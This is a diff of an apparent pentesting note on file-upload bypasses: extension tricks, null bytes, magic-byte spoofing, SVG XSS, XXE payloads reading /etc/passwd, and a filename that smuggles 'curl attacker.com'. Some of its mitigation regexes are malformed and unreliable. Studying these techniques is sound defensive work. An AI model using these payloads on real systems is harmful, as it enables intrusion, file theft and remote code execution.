@@ -20,7 +20,9 @@ Above Regex is vulnerable as it doesn’t check the case insensitivity of file e
 - File Content
 - File Size
 
-# **Scenario 1 (BlackList only php )**
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2c11caa8-85ea-442d-9e61-78969ce6b2d9/Untitled.png)
+
+# ****Scenario 1 (BlackList only php )****
 
 **Blacklisting Dangerous files?**
 
@@ -32,7 +34,7 @@ Above Regex is vulnerable as it doesn’t check the **case insensitivity** of fi
 
 **Mitigation:**
 
-`^.*\.(php|php1|php2|php3|php4|php5|php6|php7|phtml|exe)$/i`
+`^.*\\.(php|php1|php2|php3|php4|php5|php6|php7|phtml|exe)$/i`
 
 # **Scenario 2 (Apache-Linux)**
 
@@ -54,28 +56,27 @@ On windows servers, if the same validation is done for asp pages, we can bypass 
 
 In this scenario the developer is **black-listing all dangerous extensions** that would allow code execution.
 
-But how about using .`**eml**` to trigger a Stored XSS?
+But how about using .**`eml`** to trigger a Stored XSS?
 
 **Source**: [[0day] Text/Plain Considered Harmful – Jan's security blog (jankopecky.net)](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)
 
 # **Scenario 4 (Validating Filename only (Whitelist))**
 
-In this scenario, the developer is validating the filename ONLY by **Whitelisting** `.jpg` via server-side code, using below Regex
+In this scenario, the developer is validating the filename ONLY by **Whitelisting `**.jpg` via server-side code, using below Regex
 
-`^.*\.(jpg|gif|png)`
+`^.*\\.(jpg|gif|png)`
 
-The regex is **NOT properly implemented**. It validates that the filename contains `.jpg` but doesn’t validate that the filename  
-ends with `.jpg`
+The regex is **NOT properly implemented**. It validates that the filename contains `.jpg` but doesn’t validate that the filename ends with `.jpg`
 
-**Bypass →** `**test.jpg.php**`
+**Bypass → `test.jpg.php`**
 
-**Mitigation →** `**^.*\(jpg|gif|png)$\i**`
+**Mitigation → `^.*\\(jpg|gif|png)$\\i`**
 
 # **Scenario 5 (Null Byte Injection)**
 
 The **null** character is a control character with the value **zero**. PHP treats the **Null** Bytes `%00` as a terminator (same as C does).
 
-**Bypass → R**enaming your file to be `**shell.php%001.jpg**` or `**shell.php\x00.jpg**` shall satisfy the file upload page because the
+**Bypass → R**enaming your file to be **`shell.php%001.jpg`** or **`shell.php\\x00.jpg`** shall satisfy the file upload page because the
 
 file ends with .jpg, but the file will be treated as .php due to termination of whatever after the Null Byte.
 
@@ -83,18 +84,41 @@ file ends with .jpg, but the file will be treated as .php due to termination of 
 
 also **work**.
 
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8e61c8bf-1806-4ae8-b90a-70e2be2a14cf/Untitled.png)
+
 # **Scenario 6 ( allows upload of .svg images )**
 
 SVG images are just **XML data**. Using **XML** you can achieve lots of vulnerabilities, for instance `XXE`, or `Stored XSS` as below.
 
-```
-<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" >   <polygon id="triangle" points="0,0 0,50 50,0" fill="\#009900" stroke="\#004400"/>   <script type="text/javascript">      alert("xss");   </script></svg>
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1a23b859-265b-40bf-a569-fb06d945ca14/Untitled.png)
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "<http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd>">
+<svg version="1.1" baseProfile="full" >
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert("xss");
+   </script>
+</svg>
 ```
 
 [Exploiting XXE via File Upload. Before moving further we must get… | by Gupta Bless | Medium](https://gupta-bless.medium.com/exploiting-xxe-via-file-upload-f6e62153e85d)
 
-```
-<?xml version=”1.0" standalone=”yes”?><!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/hostname” > ]>These 2 lines are base of xml. The only thing I changed here is “file:///etc/hostname”. I actually mentioned a system command which upon processing fetches the file from the server.<svg width=”128px” height=”128px” xmlns=”http://www.w3.org/2000/svg" xmlns:xlink=”http://www.w3.org/1999/xlink" version=”1.1"><text font-size=”16" x=”0" y=”16">&xxe;</text></svg>------------------------------------------------------------------------------------------------------<xml> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <username>&xxe;</username> </xml>
+```xml
+<?xml version=”1.0" standalone=”yes”?>
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/hostname” > ]>
+
+These 2 lines are base of xml. The only thing I changed here is “file:///etc/hostname”. I actually mentioned a system command which upon processing fetches the file from the server.
+
+<svg width=”128px” height=”128px” xmlns=”<http://www.w3.org/2000/svg>" xmlns:xlink=”<http://www.w3.org/1999/xlink>" version=”1.1">
+
+<text font-size=”16" x=”0" y=”16">&xxe;</text>
+
+</svg>
+------------------------------------------------------------------------------------------------------
+<xml> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <username>&xxe;</username> </xml>
 ```
 
 [Zivver | Report #897244 - XXE Injection through SVG image upload leads to SSRF | HackerOne](https://hackerone.com/reports/897244)
@@ -147,7 +171,7 @@ Source (Facebook RCE): [Facebook's ImageTragick Remote Code Execution (4lemon.ru
 
 IIS in its earlier **versions < 7.0** had an issue handling the uploaded files. An attacker can bypass the file upload pages using
 
-**Bypass →** `shell.aspx;1.jpg`
+**********************Bypass →********************** `shell.aspx;1.jpg`
 
 ---
 
@@ -165,7 +189,7 @@ Developers validates the file-contents starts with Magic Numbers and the file-co
 
 **Exploit:**
 
-Uploading `shell.php` but setting the content type to `image/gif` and starting the file contants with `**GIF89a**``;` will do the job!
+Uploading `shell.php` but setting the content type to `image/gif` and starting the file contants with **`GIF89a**;` will do the job!
 
 **RCE via zip files**
 
@@ -173,7 +197,7 @@ Developers accepts **zip** file, but handle **filenames** via **command line**.
 
 **Exploit:**
 
-`**Filename;curl attacker.com;pwd.jpg**`
+**`Filename;curl attacker.com;pwd.jpg`**
 
 ---
 
@@ -182,6 +206,8 @@ Developers accepts **zip** file, but handle **filenames** via **command line**.
 If the developers are trusting the filenames and pass it directly to the Database, this will allow attackers to execute Out of Band SQL Injection.
 
 A good scenario would be companies asking you to submit your CV without validating the CV name.
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/36e19cea-dd11-4693-9ef3-c8341515f25f/Untitled.png)
 
 ---
 
@@ -196,7 +222,5 @@ are able to do Cross Origin Requests to steal CSRF tokens.
 **How browsers see it?**
 
 1. Plugins like Flash doesn't care about the extension or content-type
-
+    
 2. If the file is embeded using <object> tag, it will be executed as a Flash file as long as the file content looks like Flash.
-
-https://github.com/nccgroup/CrossSiteContentHijacking
